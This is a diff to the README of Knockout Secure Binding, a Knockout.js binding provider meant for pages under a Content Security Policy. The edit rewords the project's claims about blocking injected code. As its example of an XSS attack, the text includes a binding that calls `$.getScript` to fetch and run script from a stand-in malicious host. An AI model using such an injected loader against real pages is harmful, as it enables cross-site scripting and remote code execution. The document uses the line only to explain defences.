@@ -136,15 +136,15 @@ Content Security Policy prohibits unsafe evaluations (`eval`,
 Prohibiting unsafe evaluations with a Content Security Policy substantially substantially reduces the risk
 of a cross-site scripting attack. See for example [Preventing XSS with Content Security Policy](http://benvinegar.github.io/csp-talk-2013/).
 
-By using KSB in place of the regular binding provider one can continue use
+By using KSB in place of the regular binding provider one can continue to use
 Knockout in an environment with a Content Security Policy. This includes for example [Chrome web apps](http://developer.chrome.com/apps/contentSecurityPolicy.html).
 
-Independent of a Content Security Policy, KSB prevents the execution of arbitrary code in a Knockout binding. A malicious script such as
-`text: $.getScript('http://a.bad.place.example.com/a.bad.bad.thing')` could be executed in Knockout on a DOM element that is having bindings applied. However this script will not execute in KSB because:
+Independent of a Content Security Policy, KSB can help prevent the execution of arbitrary code in a Knockout binding. A malicious script such as
+`text: $.getScript('http://a.bad.place.example.com/a.bad.bad.thing')` could be executed in Knockout on a DOM element that is having bindings applied. However with CSP and KSB you can prevent this script from executing by/because:
 
-1. The `$` is a global, and unless explicitly added to the binding context it will not be accessible;
+1. Not including `$` as a global;
 2. Functions in KSB do not accept arguments;
-3. Your CSP should prevent accessing the host `a.bad.place.example.com`.
+3. You can use a CSP white-list, which prevents accessing the (presumably unknown) host `a.bad.place`.
 
 
 Options
